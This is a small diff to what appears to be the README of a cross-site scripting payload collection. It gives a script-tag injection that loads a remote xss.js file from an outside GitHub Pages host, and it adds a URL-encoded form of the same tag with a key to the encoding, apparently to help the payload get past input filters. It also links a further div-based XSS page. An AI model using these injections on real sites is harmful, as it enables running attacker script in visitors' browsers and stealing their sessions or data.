@@ -5,6 +5,11 @@
 Usage: <script src=//link></script>
 
 EX: <script src=//gteksd.github.io/Payloads/xss.js></script>
+    %3cscript%20src=//gteksd.github.io/Payloads/xss.js%3e%3c/script%3e  
+
+%3c = <
+%20 = space
+%3e = >
 ```
 ```
 https://gteksd.github.io/Payloads/div-xss.html
